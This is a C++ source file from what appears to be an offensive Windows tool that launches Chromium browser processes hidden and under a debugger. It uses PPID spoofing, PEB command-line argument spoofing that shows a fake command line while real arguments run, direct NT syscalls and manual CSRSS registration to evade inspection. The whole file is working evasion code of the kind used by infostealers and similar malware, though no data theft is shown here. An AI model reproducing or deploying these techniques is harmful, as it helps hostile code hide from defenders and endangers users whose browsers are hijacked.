#include "Headers.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-===-==-==-==-==-==-==-==-==-==-===-==-==-==-==-==-==-==-==-==-==
// Extern Global (Defined in 'ResolvePrgrmAPIs.cpp')

extern DINMCLY_RSOLVD_FUNCTIONS g_ResolvedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Extern Function (Defined in 'CsrssRegistration.cpp')

extern BOOL RegisterProcessWithCsrss(
    IN      HANDLE               hProcess,
    IN      HANDLE               hThread,
    IN      PPS_CREATE_INFO      pCreateInfo,
    IN      PUNICODE_STRING      pWin32Path,
    IN      PUNICODE_STRING      pNtPath,
    IN      PCLIENT_ID           pClientId,
    IN      USHORT               DllCharacteristics
);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// No Arguments or PPID Spoofing & Using WinAPIs

BOOL CreateChromiumProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, OUT CREATED_PROCESS_PROPERTIES* pProcessProp)
{
    STARTUPINFOW            StartupInfoW            = { 0 };
    PROCESS_INFORMATION     ProcessInfo             = { 0 };
    SECURITY_ATTRIBUTES     SecurityAttribute       = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    LPWSTR                  szCmdLine               = NULL;
    SIZE_T                  cbCmdLine               = 0x00;
    HRESULT                 hResult                 = S_OK;
    HANDLE                  hNul                    = INVALID_HANDLE_VALUE;

    if (!szProcessPath || !pProcessProp) return FALSE;

    RtlSecureZeroMemory(pProcessProp, sizeof(PROCESS_INFORMATION));

    StartupInfoW.cb  = sizeof(STARTUPINFOW);
    cbCmdLine        = (lstrlenW(szProcessPath) + 3) * sizeof(WCHAR);

    if (szArguments) cbCmdLine += (lstrlenW(szArguments) + 1) * sizeof(WCHAR);

    if (!(szCmdLine = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCmdLine)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if (szArguments)
    {
        if (FAILED((hResult = StringCbPrintfW(szCmdLine, cbCmdLine, L"\"%s\" %s", szProcessPath, szArguments))))
        {
            DBGA("[!] StringCbPrintfW Failed With Error: 0x%0.8X", hResult);
            goto _END_OF_FUNC;
        }
    }
    else
    {
        if (FAILED((hResult = StringCbPrintfW(szCmdLine, cbCmdLine, L"\"%s\"", szProcessPath))))
        {
            DBGA("[!] StringCbPrintfW Failed With Error: 0x%0.8X", hResult);
            goto _END_OF_FUNC;
        }
    }

    // Redirect stderr to NUL to suppress browser debug output
    if ((hNul = CreateFileW(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, &SecurityAttribute, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
    {
        StartupInfoW.dwFlags    = STARTF_USESTDHANDLES;
        StartupInfoW.hStdInput  = NULL;
        StartupInfoW.hStdOutput = hNul;
        StartupInfoW.hStdError  = hNul;
    }

    if (!CreateProcessW(NULL, szCmdLine, NULL, NULL, TRUE, (DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW | DETACHED_PROCESS), NULL, NULL, &StartupInfoW, &ProcessInfo))
    {
        DBGA("[!] CreateProcessW Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    pProcessProp->dwProcessId   = ProcessInfo.dwProcessId;
    pProcessProp->dwThreadId    = ProcessInfo.dwThreadId;
    pProcessProp->hProcess      = ProcessInfo.hProcess;
    pProcessProp->hThread       = ProcessInfo.hThread;

_END_OF_FUNC:
    if (hNul != INVALID_HANDLE_VALUE)
        CloseHandle(hNul);
    HEAP_FREE(szCmdLine);
    return pProcessProp->hProcess ? TRUE : FALSE;
}

BOOL DetachDebugger(IN CREATED_PROCESS_PROPERTIES* pProcessProp)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;

    if (!pProcessProp) return FALSE;

    if (!DebugActiveProcessStop(pProcessProp->dwProcessId))
    {
        DBGA("[!] DebugActiveProcessStop Failed With Error: %d", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Argument & PPID Spoofing & Using Syscalls

static BOOL SpoofProcessArguments(IN HANDLE hProcess, IN LPCWSTR szProcessPath, IN LPCWSTR szRealCommandLine)
{
    PROCESS_BASIC_INFORMATION   ProcBasicInfo       = { 0 };
    PEB                         Peb                 = { 0 };
    RTL_USER_PROCESS_PARAMETERS ProcParams          = { 0 };
    UNICODE_STRING              usRealCmdLine       = { 0 };
    NTSTATUS                    ntStatus            = STATUS_SUCCESS;
    ULONG                       ulReturnLength      = 0x00;
    SIZE_T                      cbRealCmdLine       = 0x00,
                                cbFullCmdLine       = 0x00;
    USHORT                      usNewLength         = 0x00;
    LPWSTR                      szFullCmdLine       = NULL;
    LPCWSTR                     szArgs              = NULL;
    HRESULT                     hResult             = S_OK;

    if (!g_ResolvedFunctions.pInitialized || !hProcess || !szProcessPath || !szRealCommandLine)
        return FALSE;

    // 1. Get PEB Address
    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &ProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulReturnLength))))
    {
        DBGA("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X\n", ntStatus);
        return FALSE;
    }

    // 2. Read PEB
    if (!NtReadFromTargetProcess(hProcess, ProcBasicInfo.PebBaseAddress, &Peb, sizeof(PEB)))
        return FALSE;

    // 3. Read Process Parameters
    if (!NtReadFromTargetProcess(hProcess, Peb.ProcessParameters, &ProcParams, sizeof(RTL_USER_PROCESS_PARAMETERS)))
        return FALSE;

    // 4. Build Full Command Line: "C:\path\to\exe.exe" <args>
    if (szRealCommandLine[0] == L'-' || szRealCommandLine[0] == L'/')
    {
        cbFullCmdLine = (1 + lstrlenW(szProcessPath) + 1 + 1 + lstrlenW(szRealCommandLine) + 1) * sizeof(WCHAR);

        if (!(szFullCmdLine = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbFullCmdLine)))
        {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            return FALSE;
        }

        hResult = StringCbPrintfW(szFullCmdLine, cbFullCmdLine, L"\"%s\" %s", szProcessPath, szRealCommandLine);
    }
    else
    {
        szArgs        = StrChrW(szRealCommandLine, L' ');
        cbFullCmdLine = (1 + lstrlenW(szProcessPath) + 1 + (szArgs ? lstrlenW(szArgs) : 0) + 1) * sizeof(WCHAR);


        if (!(szFullCmdLine = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbFullCmdLine)))
        {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            return FALSE;
        }

        if (szArgs)
            hResult = StringCbPrintfW(szFullCmdLine, cbFullCmdLine, L"\"%s\"%s", szProcessPath, szArgs);
        else
            hResult = StringCbPrintfW(szFullCmdLine, cbFullCmdLine, L"\"%s\"", szProcessPath);
    }

    if (FAILED(hResult))
    {
        DBGA("[!] StringCbPrintfW Failed With Error: 0x%0.8X", hResult);
        HeapFree(GetProcessHeap(), 0, szFullCmdLine);
        return FALSE;
    }

    // 5. Validate Size
    cbRealCmdLine = (lstrlenW(szFullCmdLine) + 1) * sizeof(WCHAR);

    if (cbRealCmdLine > ProcParams.CommandLine.MaximumLength)
    {
        DBGA("[!] Real Command Line Is Too Long! Max: %u, Need: %llu", ProcParams.CommandLine.MaximumLength, cbRealCmdLine);
        HeapFree(GetProcessHeap(), 0, szFullCmdLine);
        return FALSE;
    }

    // 6. Write Full Command Line To Buffer
    if (!NtWriteToTargetProcess(hProcess, ProcParams.CommandLine.Buffer, (PVOID)szFullCmdLine, cbRealCmdLine))
    {
        HeapFree(GetProcessHeap(), 0, szFullCmdLine);
        return FALSE;
    }

    // 7. Update CommandLine Structure
    usRealCmdLine.Length        = (USHORT)(cbRealCmdLine - sizeof(WCHAR));
    usRealCmdLine.MaximumLength = ProcParams.CommandLine.MaximumLength;
    usRealCmdLine.Buffer        = ProcParams.CommandLine.Buffer;

    if (!NtWriteToTargetProcess(hProcess, (PBYTE)Peb.ProcessParameters + FIELD_OFFSET(RTL_USER_PROCESS_PARAMETERS, CommandLine), &usRealCmdLine, sizeof(UNICODE_STRING)))
    {
        HeapFree(GetProcessHeap(), 0, szFullCmdLine);
        return FALSE;
    }

    DBGV("[+] Arguments Spoofed Successfully!");

    // 8. Patch CommandLine.Length To Show Only Quoted Process Path
    usNewLength = (USHORT)((1 + lstrlenW(szProcessPath) + 1) * sizeof(WCHAR));

    if (!NtWriteToTargetProcess(hProcess, (PBYTE)Peb.ProcessParameters + FIELD_OFFSET(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), &usNewLength, sizeof(USHORT)))
    {
        HeapFree(GetProcessHeap(), 0, szFullCmdLine);
        return FALSE;
    }

    DBGV("[+] CommandLine Length Patched To %u Bytes", usNewLength);

    HeapFree(GetProcessHeap(), 0, szFullCmdLine);

    return TRUE;
}

BOOL NtCreateChromiumProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, IN OUT CREATED_PROCESS_PROPERTIES* pProcessProp)
{
    OBJECT_ATTRIBUTES               ObjAttribute            = {   };
    PRTL_USER_PROCESS_PARAMETERS    pUserProcParameters     = NULL;
    PS_CREATE_INFO                  CreateInfo              = {   };
    SECTION_IMAGE_INFORMATION       SectionImageInfo        = {   };
    PS_ATTRIBUTE_LIST_5             AttributeList5          = {   };
    CLIENT_ID                       ClientId                = {   };
    DBGUI_WAIT_STATE_CHANGE         WaitStateChange         = {   };
    UNICODE_STRING                  usDosImgPath            = {   };
    UNICODE_STRING                  usNtImgPath             = {   };
    UNICODE_STRING                  usCmdLine               = {   };
    UNICODE_STRING                  usCurrentDir            = {   };
    LPWSTR                          szNtImgPath             = NULL,
                                    szFakeCommandLine       = NULL,
                                    szCurrentDir            = NULL;
    SIZE_T                          cbNtImgPath             = 0x00,
                                    cbCurrentDir            = 0x00;    
    HANDLE                          hParentProcess          = NULL;
    DWORD                           dwParentProcessId       = 0x00;
    HRESULT                         hResults                = S_OK;
    NTSTATUS                        ntStatus                = STATUS_SUCCESS;
    BOOL                            bResult                 = FALSE;
    ULONG                           ulAttributeCount        = 0x00;

    if (!g_ResolvedFunctions.pInitialized || !szProcessPath || !pProcessProp)
        return FALSE;

    
    dwParentProcessId = pProcessProp->dwParentProcessId;
    RtlSecureZeroMemory(pProcessProp, sizeof(CREATED_PROCESS_PROPERTIES));

    // 0. Generate A Fake Command Line 
    if (!(szFakeCommandLine = GenerateFakeCommandLine(szArguments, szProcessPath)))
    {
        DBGA("[!] Failed To Generate Fake Command Line");
        goto _END_OF_FUNC;
    }
    
    DBGV("[v] Fake Command Line: %ls", szFakeCommandLine);
//  DBGV("[v] Real Command Line: %ls", szArguments);

    // 1. Convert Process Image Path To NT Format
    cbNtImgPath = (4 + lstrlenW(szProcessPath) + 1) * sizeof(WCHAR);
    
    if (!(szNtImgPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbNtImgPath)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }
    
    if (FAILED((hResults = StringCbPrintfW(szNtImgPath, cbNtImgPath, L"\\??\\%s", szProcessPath))))
    {
        DBGA("[!] StringCbPrintfW Failed With Error: 0x%0.8X", hResults);
        goto _END_OF_FUNC;
    }

    // 2. Extract Current Directory From Process Path
    cbCurrentDir = (lstrlenW(szProcessPath) + 1) * sizeof(WCHAR);
    
    if (!(szCurrentDir = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCurrentDir)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }
    
    if (FAILED((hResults = StringCbCopyW(szCurrentDir, cbCurrentDir, szProcessPath))))
    {
        DBGA("[!] StringCbCopyW Failed With Error: 0x%0.8X", hResults);
        goto _END_OF_FUNC;
    }
    
    PathRemoveFileSpecW(szCurrentDir);
    PathAddBackslashW(szCurrentDir);
    
    // 4. Open Parent Process For PPID Spoofing
    if (dwParentProcessId)
    {
        if (!(hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentProcessId)))
        {
            DBGA("[!] OpenProcess [%lu] Failed With Error: %lu", dwParentProcessId, GetLastError());
            DBGA("[i] Proceeding Without PPID Spoofing...");
        }
    }

    // 5. Create Debug Object
    InitializeObjectAttributes(&ObjAttribute, NULL, 0, NULL, NULL);
    
    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtCreateDebugObject(&pProcessProp->hDebugObject, DEBUG_ALL_ACCESS, &ObjAttribute, 0))))
    {
        DBGA("[!] NtCreateDebugObject Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }
    
    // 6. Create Process Parameters
    RtlInitUnicodeString(&usNtImgPath, szNtImgPath);
    RtlInitUnicodeString(&usDosImgPath, szProcessPath);
    RtlInitUnicodeString(&usCurrentDir, szCurrentDir);

    if (szFakeCommandLine)
        RtlInitUnicodeString(&usCmdLine, szFakeCommandLine);
    else
        RtlInitUnicodeString(&usCmdLine, szArguments);

    ntStatus = g_ResolvedFunctions.pRtlCreateProcessParametersEx(
        &pUserProcParameters,                           // PRTL_USER_PROCESS_PARAMETERS*    ProcessParameters
        &usDosImgPath,                                  // PCUNICODE_STRING                 ImagePathName
        NULL,                                           // PCUNICODE_STRING                 DllPath
        &usCurrentDir,                                  // PCUNICODE_STRING                 CurrentDirectory
        &usCmdLine,                                     // PCUNICODE_STRING                 CommandLine
        NULL,                                           // PVOID                            Environment
        NULL,                                           // PCUNICODE_STRING                 WindowTitle
        NULL,                                           // PCUNICODE_STRING                 DesktopInfo
        NULL,                                           // PCUNICODE_STRING                 ShellInfo
        NULL,                                           // PCUNICODE_STRING                 RuntimeData
        RTL_USER_PROC_PARAMS_NORMALIZED                 // ULONG                            Flags
    );

    if (!NT_SUCCESS(ntStatus))
    {
        DBGA("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    // 7. Initialize PS_CREATE_INFO & PS_ATTRIBUTE_LIST & PS_STD_HANDLE_INFO
    RtlSecureZeroMemory(&CreateInfo, sizeof(PS_CREATE_INFO));
    RtlSecureZeroMemory(&AttributeList5, sizeof(PS_ATTRIBUTE_LIST_5));

    // Set InitFlags to tell the kernel to populate SuccessState on return
    // WriteOutputOnExit && DetectManifest && ProhibitedImageCharacteristics
    CreateInfo.Size                             = sizeof(PS_CREATE_INFO);
    CreateInfo.State                            = PsCreateInitialState;
    CreateInfo.InitState.u1.InitFlags           = 3;
    CreateInfo.InitState.AdditionalFileAccess   = FILE_READ_ATTRIBUTES | FILE_READ_DATA;

    // Attribute 0: Image Name
    AttributeList5.Attributes[ulAttributeCount].Attribute       = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList5.Attributes[ulAttributeCount].Size            = usNtImgPath.Length;
    AttributeList5.Attributes[ulAttributeCount].Value           = (ULONG_PTR)usNtImgPath.Buffer;
    ulAttributeCount++;

    // Attribute 1: Debug Object
    AttributeList5.Attributes[ulAttributeCount].Attribute       = PS_ATTRIBUTE_DEBUG_OBJECT;
    AttributeList5.Attributes[ulAttributeCount].Size            = sizeof(HANDLE);
    AttributeList5.Attributes[ulAttributeCount].Value           = (ULONG_PTR)pProcessProp->hDebugObject;
    ulAttributeCount++;

    // Attribute 2: Client ID
    AttributeList5.Attributes[ulAttributeCount].Attribute       = PS_ATTRIBUTE_CLIENT_ID;
    AttributeList5.Attributes[ulAttributeCount].Size            = sizeof(CLIENT_ID);
    AttributeList5.Attributes[ulAttributeCount].ValuePtr        = &ClientId;
    ulAttributeCount++;

    // Attribute 3: Image Info 
    AttributeList5.Attributes[ulAttributeCount].Attribute       = PS_ATTRIBUTE_IMAGE_INFO;
    AttributeList5.Attributes[ulAttributeCount].Size            = sizeof(SECTION_IMAGE_INFORMATION);
    AttributeList5.Attributes[ulAttributeCount].ValuePtr        = &SectionImageInfo;
    ulAttributeCount++;

    // Attribute 4: Parent Process
    if (hParentProcess)
    {
        AttributeList5.Attributes[ulAttributeCount].Attribute   = PS_ATTRIBUTE_PARENT_PROCESS;
        AttributeList5.Attributes[ulAttributeCount].Size        = sizeof(HANDLE);
        AttributeList5.Attributes[ulAttributeCount].Value       = (ULONG_PTR)hParentProcess;
        ulAttributeCount++;
    }

    // Set TotalLength based on actual attribute count
    AttributeList5.TotalLength = sizeof(SIZE_T) + (ulAttributeCount * sizeof(PS_ATTRIBUTE));

    // 8. Create Debugged Process

    // Set window & console flags to hide the window/console
    pUserProcParameters->WindowFlags        = STARTF_USESHOWWINDOW;
    pUserProcParameters->ShowWindowFlags    = SW_HIDE;
    pUserProcParameters->ConsoleHandle      = CONSOLE_DETACHED_PROCESS;
    pUserProcParameters->StandardInput      = NULL;
    pUserProcParameters->StandardOutput     = NULL;
    pUserProcParameters->StandardError      = NULL;

    ntStatus = g_ResolvedFunctions.pNtCreateUserProcess(
        &pProcessProp->hProcess,
        &pProcessProp->hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        0,
        0,
        pUserProcParameters,
        &CreateInfo,
        (PPS_ATTRIBUTE_LIST)&AttributeList5
    );


    if (!NT_SUCCESS(ntStatus))
    {
        DBGA("[!] NtCreateUserProcess Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }
    
    DBGV("[v] Created Process With ID: %lu", (DWORD)(ULONG_PTR)ClientId.UniqueProcess);

    // 9. Wait For Debug Event
    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtWaitForDebugEvent(pProcessProp->hDebugObject, FALSE, NULL, &WaitStateChange))))
    {
        DBGA("[!] NtWaitForDebugEvent Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    // 10. Spoof Arguments
    if (!SpoofProcessArguments(pProcessProp->hProcess, szProcessPath, szArguments))
        goto _END_OF_FUNC;
    
    // 11. Register Process With Csrss
    if (RegisterProcessWithCsrss(pProcessProp->hProcess, pProcessProp->hThread, &CreateInfo, &usDosImgPath, &usNtImgPath, &ClientId, SectionImageInfo.DllCharacteristics))
        DBGV("[i] Process Registered With CSRSS");

    // 12. Continue Debug Event
    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtDebugContinue(pProcessProp->hDebugObject, &WaitStateChange.AppClientId, DBG_CONTINUE))))
    {
        DBGA("[!] NtDebugContinue Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    // 13. Populate Output
    pProcessProp->dwProcessId  = (DWORD)(ULONG_PTR)ClientId.UniqueProcess;
    pProcessProp->dwThreadId   = (DWORD)(ULONG_PTR)ClientId.UniqueThread;
    bResult                    = TRUE;

_END_OF_FUNC:
    if (szNtImgPath)
        HeapFree(GetProcessHeap(), 0, szNtImgPath);
    if (szCurrentDir)
        HeapFree(GetProcessHeap(), 0, szCurrentDir);
    if (szFakeCommandLine)
        HeapFree(GetProcessHeap(), 0, szFakeCommandLine);
    if (pUserProcParameters)
        g_ResolvedFunctions.pRtlDestroyProcessParameters(pUserProcParameters);
    if (hParentProcess)
        CloseHandle(hParentProcess);

    if (!bResult)
    {
        if (pProcessProp->hDebugObject)
            CloseHandle(pProcessProp->hDebugObject);
        if (pProcessProp->hProcess)
            CloseHandle(pProcessProp->hProcess);
        if (pProcessProp->hThread)
            CloseHandle(pProcessProp->hThread);

        RtlSecureZeroMemory(pProcessProp, sizeof(CREATED_PROCESS_PROPERTIES));
    }

    return bResult;
}

BOOL NtDetachDebugger(IN CREATED_PROCESS_PROPERTIES* pProcessProp)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;

    if (!pProcessProp || !g_ResolvedFunctions.pInitialized) return FALSE;
    
    if (!pProcessProp->hDebugObject) return FALSE;

    if (!NT_SUCCESS((ntStatus = g_ResolvedFunctions.pNtRemoveProcessDebug(pProcessProp->hProcess, pProcessProp->hDebugObject))))
    {
        DBGA("[!] NtRemoveProcessDebug Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    pProcessProp->hDebugObject = NULL;

    return TRUE;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
